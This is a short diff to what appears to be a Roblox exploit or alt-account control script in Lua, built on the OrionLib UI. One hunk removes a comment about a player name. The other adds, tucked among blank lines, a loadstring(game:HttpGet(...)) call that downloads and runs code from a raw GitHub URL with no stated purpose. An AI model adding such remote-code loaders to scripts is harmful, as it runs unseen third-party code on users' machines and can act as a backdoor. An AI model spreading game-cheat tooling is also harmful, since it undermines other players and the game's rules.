@@ -2099,7 +2099,7 @@ OrionLib:MakeNotification({
 
 rbxname = "x1e2p"
 local prefix = "!"
-local LPlayer = game.Players.x1e2p -- your name on my name (maxbrh1)
+local LPlayer = game.Players.x1e2p
 messageLL = "Тимурка хороший" 
 speed = 1 --how fast tweengoto is 
 render1 = false --if alts auto unrender when excuted
@@ -2751,7 +2751,7 @@ if render1 == true then
 
 
 
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zxclua/TimurkaProLuaCoder228/main/yessssssskimozoncontrol"))()
 
 
 
